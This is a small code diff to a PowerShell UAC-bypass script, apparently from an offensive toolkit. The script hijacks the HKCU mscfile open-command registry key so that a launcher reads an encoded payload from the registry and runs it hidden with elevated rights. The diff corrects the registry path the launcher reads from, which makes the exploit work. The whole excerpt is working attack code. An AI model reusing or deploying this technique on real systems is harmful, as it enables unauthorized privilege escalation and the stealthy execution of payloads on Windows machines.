@@ -61,7 +61,7 @@ This will write out "Is Elevated: True" to C:\UACBypassTest.
         $null = Set-ItemProperty -Force -Path $path -Name $name -Value $Command;
 
         $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
-        $launcherCommand = $pshome + '\' + 'powershell.exe -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x'
+        $launcherCommand = $pshome + '\' + 'powershell.exe -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows).Update); powershell -NoP -NonI -W Hidden -enc $x'
         #Add in the new registry entries to hijack the msc file
         if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
             New-Item $mscCommandPath -Force |
